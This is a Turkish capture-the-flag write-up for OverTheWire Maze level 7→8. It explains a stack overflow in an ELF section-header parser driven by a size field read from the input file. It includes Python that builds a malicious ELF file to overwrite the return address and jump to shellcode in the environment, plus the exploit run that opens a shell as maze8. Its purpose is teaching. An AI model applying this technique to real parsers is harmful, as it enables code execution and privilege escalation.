# OverTheWire — Maze Level 7 → 8

> Hedef: `maze7`'den `maze8` şifresi. Sonuç: **`**********`** (gizlendi)
> Teknik: Bir ELF section-header parser'ında **dosyadan-okunan boyutla (`e_shentsize`) sabit stack buffer'ı taşırma** → dönüş adresi ezme → env shellcode (NX kapalı).

---

## 1. İlk Bakış
```bash
/maze/maze7 file        # usage: /maze/maze7 file
checksec: No canary | NX DISABLED | No PIE | No RELRO
```
Program argv[1]'deki dosyayı bir **ELF** gibi okuyup section-header'ları döker.

## 2. Analiz
`main`: dosyanın ilk 52 baytını (ELF başlığı) okur ve şu alanları çıkarır → `Print_Shdrs`'a verir:
| Alan | ELF offset | Rol |
|------|-----------|-----|
| `e_shoff` | 0x20 | section-header tablosunun dosya offset'i |
| `e_shstrndx` | 0x32 | string-table section index'i |
| `e_shnum` | 0x30 | section sayısı (döngü sayısı) |
| `e_shentsize` | 0x2e | **her section header'ın boyutu** |

`Print_Shdrs` (özet):
```c
Elf32_Shdr local;             // [ebp-0x3c]  SABİT stack buffer
...
for (i = 0; i <= shnum; i++) {
    read(fd, &local, shentsize);   // <-- shentsize DOSYADAN; sınır yok!
    printf("%2d: %-16s\t0x%08x\t0x%04x\n", i, strtab+local.sh_name, local.sh_addr, local.sh_size);
}
```

## 3. Zafiyet
`read(fd, &local, shentsize)` — `local` 0x3c offset'inde sabit; `[ebp-0x3c]`'ten `[ebp+4]` (dönüş adresi) arası **0x40 bayt**. `e_shentsize > 0x40` yaparsak okuma **dönüş adresini ezer**. Okunan baytlar bizim dosyamızdan geldiği için **tam kontrol** bizde. NX kapalı → dönüş adresini env'deki shellcode'a yönlendiririz.

> Döngü `i <= shnum` (off-by-one). `shnum=1` ile 2 iterasyon olur; **son** `read` dönüş adresini belirler. İki özdeş blok koyarak her iki iterasyonda da `ret = shellcode` yaptım.

## 4. Crafted ELF (200 bayt)
```python
f[0x20:0x24] = p32(0x40)     # e_shoff = 0x40
f[0x2e:0x30] = p16(0x44)     # e_shentsize = 0x44  (>0x40 -> overflow)
f[0x30:0x32] = p16(1)        # e_shnum = 1
f[0x32:0x34] = p16(0)        # e_shstrndx = 0
# blok @0x40 (hem shdrs hem dongu i=0):
f[0x40+0x10:..] = p32(0)     # sh_offset (strtab) = 0   (crash olmasin)
f[0x40+0x14:..] = p32(0x10)  # sh_size  (strtab) = 0x10
f[0x40+0x40:..] = p32(target)# ret  (i=0)
# blok @0x84 (dongu i=1, SON read):
f[0x84+0x40:..] = p32(target)# ret  (final)
```
`target` = env'deki NOP-sled+shellcode adresi (ASLR kapalı; eşleştirilmiş printer ile bulundu). Dosya baytlarında **null serbest** (memfrob/strcpy yok) → adresleri rahatça gömeriz.

## 5. Exploit
```bash
printf 'cat /etc/maze_pass/maze8\n' | python3 x.py
# SC=0xffffddc0 target=0xffffdec0
# uid=15008(maze8) ... <maze8 şifresi>
```
`Print_Shdrs` ret edince `target`'a (shellcode) atlar → `setresuid` + `execve("/bin/sh")` → maze8.

## Dersler
| Konu | Not |
|------|-----|
| Parser overflow | Dosya/ağ verisinden gelen **boyut alanı** sabit buffer'a okunursa overflow olur (ELF/PE/PDF parser'ları klasik hedef) |
| Güvenilmeyen metadata | `e_shentsize`/`e_shnum` saldırgan kontrolünde; asla sınır varsaymadan kullanılmaz |
| off-by-one (`<=`) | Döngü bir fazla döner; "son yazan kazanır" mantığıyla payload yerleştir |
| NX kapalı + ret2env | Dönüş adresi env'deki shellcode'a; dosya verisi null içerebildiği için adresleme kolay |
| Robustluk | strtab okuması crash etmesin diye `sh_offset/sh_size` ve `sh_name` küçük/geçerli ayarlanır |
